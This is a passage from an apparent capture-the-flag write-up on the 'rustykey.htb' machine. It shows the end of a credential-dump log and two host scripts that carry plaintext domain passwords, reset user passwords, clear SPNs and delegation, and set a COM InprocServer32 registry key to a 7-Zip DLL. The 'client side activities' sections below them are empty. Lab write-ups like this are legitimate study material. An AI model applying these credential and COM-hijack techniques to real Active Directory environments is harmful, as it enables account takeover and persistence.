[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```


### Files

```bash
PS C:\Users\Administrator\Links> cat script_01.ps1
Get-Process explorer | Stop-Process -Force
Get-Process rundll32 | Stop-Process -Force

$username = "rustykey.htb\mm.turner"
$password = 'S3econdDeleg@tor!'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
$process = Start-Process -FilePath "C:\Windows\explorer.exe" -Credential $credential -WorkingDirectory "C:\Windows\" -PassThru -WindowStyle Hidden

sleep 4

reg add "HKLM\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /t REG_SZ /d "C:\Program Files\7-Zip\7-zip.dll" /f
```

```bash
PS C:\Users\Administrator\Links> cat script_02.ps1
# default  Passwords
Set-ADAccountPassword -Identity "CN=ee.reed,OU=Users,OU=Support,DC=rustykey,DC=htb" -NewPassword (ConvertTo-SecureString "Read@00!" -AsPlainText -Force) -Reset
Set-ADAccountPassword -Identity "CN=dd.ali,OU=Users,OU=Finance,DC=rustykey,DC=htb" -NewPassword (ConvertTo-SecureString "Ellie@102!" -AsPlainText -Force) -Reset
Set-ADAccountPassword -Identity "CN=bb.morgan,OU=Users,OU=IT,DC=rustykey,DC=htb" -NewPassword (ConvertTo-SecureString "Meorjan#648!" -AsPlainText -Force) -Reset
Set-ADAccountPassword -Identity "CN=gg.anderson,OU=Users,OU=IT,DC=rustykey,DC=htb" -NewPassword (ConvertTo-SecureString "Undercon@682!" -AsPlainText -Force) -Reset

# clear SPN of dd.ali user :
Set-ADUser -Identity "CN=rr.parker,CN=Users,DC=rustykey,DC=htb" -ServicePrincipalNames $null
Set-ADUser -Identity "CN=mm.turner,CN=Users,DC=rustykey,DC=htb" -ServicePrincipalNames $null
Set-ADUser -Identity "CN=bb.morgan,OU=Users,OU=IT,DC=rustykey,DC=htb" -ServicePrincipalNames $null
Set-ADUser -Identity "CN=gg.anderson,OU=Users,OU=IT,DC=rustykey,DC=htb" -ServicePrincipalNames $null
Set-ADUser -Identity "CN=dd.ali,OU=Users,OU=Finance,DC=rustykey,DC=htb" -ServicePrincipalNames $null
Set-ADUser -Identity "CN=ee.reed,OU=Users,OU=Support,DC=rustykey,DC=htb" -ServicePrincipalNames $null
Set-ADUser -Identity "CN=nn.marcos,CN=Users,DC=rustykey,DC=htb" -ServicePrincipalNames $null

# Default Groups :
Remove-ADGroupMember -Identity "HelpDesk" -Members "IT-Computer3$" -Confirm:$false

# Define Protected Group and Groups to Check
$ProtectedGroup = "CN=Protected Objects,CN=Users,DC=rustykey,DC=htb"
$GroupsToCheck = @("CN=IT,CN=Users,DC=rustykey,DC=htb", "CN=Support,CN=Users,DC=rustykey,DC=htb")

# Add specified groups to the Protected Group if they are not already members
foreach ($Group in $GroupsToCheck) {
    if (-not (Get-ADGroupMember $ProtectedGroup | Where-Object DistinguishedName -eq $Group)) {
        Add-ADGroupMember $ProtectedGroup -Members $Group
    }
}

# Allowed Groups that should not be removed
$AllowedGroups = @(
    "CN=IT,CN=Users,DC=rustykey,DC=htb",
    "CN=Support,CN=Users,DC=rustykey,DC=htb"
)

# Remove members not in the allowed list
Get-ADGroupMember $ProtectedGroup | Where-Object { $_.DistinguishedName -notin $AllowedGroups } |
    ForEach-Object {
        Remove-ADGroupMember -Identity $ProtectedGroup -Members $_.DistinguishedName -Confirm:$false
    }


# clear dc PrincipalsAllowedToDelegateToAccount attribute

Set-ADComputer -Identity "DC" -PrincipalsAllowedToDelegateToAccount @()
```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```